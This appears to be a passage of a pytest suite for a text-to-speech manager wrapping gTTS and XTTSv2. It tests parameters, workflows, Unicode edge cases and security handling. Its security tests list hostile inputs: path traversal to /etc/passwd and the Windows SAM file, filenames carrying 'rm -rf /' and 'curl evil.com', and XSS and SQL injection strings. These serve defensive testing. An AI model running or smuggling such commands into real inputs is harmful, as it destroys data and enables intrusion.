    def test_xttsv2_synthesize_parameter_validation(self, mock_exists, mock_coqui, mock_ensure_dirs):
        """Test that XTTSv2 is called with exact expected parameters"""
        mock_tts_instance = Mock()
        mock_tts_instance.languages = ["en", "es", "fr"]
        mock_coqui.return_value = mock_tts_instance
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model"
        )
        
        test_text = "XTTSv2 test text"
        test_output = "/xtts/output.wav"
        test_speaker = "/xtts/speaker.wav"
        test_lang = "fr"
        
        manager._xttsv2_synthesize_blocking(test_text, test_output, test_speaker, test_lang)
        
        # Validate exact call parameters
        mock_tts_instance.tts_to_file.assert_called_once_with(
            text=test_text,
            speaker_wav=test_speaker,
            language=test_lang,
            file_path=test_output
        )


class TestTTSManagerIntegrationScenarios:
    """Test suite for integration-like scenarios combining multiple methods"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS')
    def test_service_switching_workflow(self, mock_coqui, mock_gtts, mock_ensure_dirs):
        """Test workflow that involves checking available services and using them"""
        # Test the static method integration
        services = TTSManager.list_services()
        assert "gtts" in services
        assert "xttsv2" in services
        
        # Test getting models for each service
        gtts_models = TTSManager.get_available_models("gtts")
        xtts_models = TTSManager.get_available_models("xttsv2")
        
        assert len(gtts_models) > 0
        assert len(xtts_models) > 0
        
        # Test creating managers for each service
        gtts_manager = TTSManager(tts_service_name="gtts")
        xtts_manager = TTSManager(
            tts_service_name="xttsv2", 
            model_name=xtts_models[0]
        )
        
        assert gtts_manager.is_initialized is True
        assert xtts_manager.is_initialized is True
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_complete_synthesis_workflow(self, mock_gtts, mock_ensure_dirs):
        """Test complete end-to-end synthesis workflow"""
        # Initialize manager
        manager = TTSManager(tts_service_name="gtts", language="en")
        assert manager.is_initialized is True
        
        # Perform synthesis
        with patch('asyncio.to_thread') as mock_to_thread, \
             patch('os.makedirs') as mock_makedirs:
            mock_to_thread.return_value = None
            
            result = await manager.synthesize("Integration test", "integration.mp3")
            
            # Verify complete workflow
            assert result is not None
            mock_makedirs.assert_called_once()
            mock_to_thread.assert_called_once()


class TestTTSManagerBoundaryConditions:
    """Test suite for boundary conditions and extreme scenarios"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_unicode_edge_cases(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with various Unicode edge cases"""
        manager = TTSManager(tts_service_name="gtts")
        
        unicode_tests = [
            "Hello 🌍",  # Emoji
            "Café naïve résumé",  # Accented characters
            "русский текст",  # Cyrillic
            "日本語テスト",  # Japanese
            "🎵🎶🎵🎶",  # Multiple emojis
            "\u200B\u200C\u200D",  # Zero-width characters
            "Test\nwith\nnewlines",  # Newlines
            "Test\twith\ttabs",  # Tabs
        ]
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            for i, text in enumerate(unicode_tests):
                result = await manager.synthesize(text, f"unicode_{i}.mp3")
                assert result is not None
                
    @patch('tts_manager.ensure_client_directories')
    def test_initialization_memory_pressure(self, mock_ensure_dirs):
        """Test initialization under simulated memory pressure"""
        # Create many manager instances to test for memory leaks or issues
        managers = []
        for i in range(100):
            manager = TTSManager(tts_service_name="nonexistent")
            managers.append(manager)
            
        # Verify all failed gracefully
        assert all(not m.is_initialized for m in managers)
        assert len(managers) == 100


class TestTTSManagerSecurityScenarios:
    """Test suite for security-related scenarios"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_path_injection_resistance(self, mock_gtts, mock_ensure_dirs):
        """Test resistance to path injection attempts"""
        manager = TTSManager(tts_service_name="gtts")
        
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/dev/null",
            "CON",  # Windows reserved name
            "PRN",  # Windows reserved name
            "test.mp3; rm -rf /",  # Command injection attempt
            "test.mp3 && curl evil.com",  # Command chaining attempt
        ]
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            for filename in malicious_filenames:
                # Should handle gracefully without security issues
                try:
                    await manager.synthesize("Safe text", filename)
                except (ValueError, OSError, TypeError):
                    # Expected for some malicious inputs
                    pass
                    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_text_injection_handling(self, mock_gtts, mock_ensure_dirs):
        """Test handling of potentially malicious text input"""
        manager = TTSManager(tts_service_name="gtts")
        
        malicious_texts = [
            "<script>alert('xss')</script>",  # XSS attempt
            "'; DROP TABLE users; --",  # SQL injection style
            "\x00\x01\x02\x03",  # Binary characters
            "A" * 1000000,  # Extremely long text (1MB)
        ]
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            for i, text in enumerate(malicious_texts):
                # Should handle without crashing
                result = await manager.synthesize(text, f"malicious_{i}.mp3")
                # May return None or a path, both are acceptable

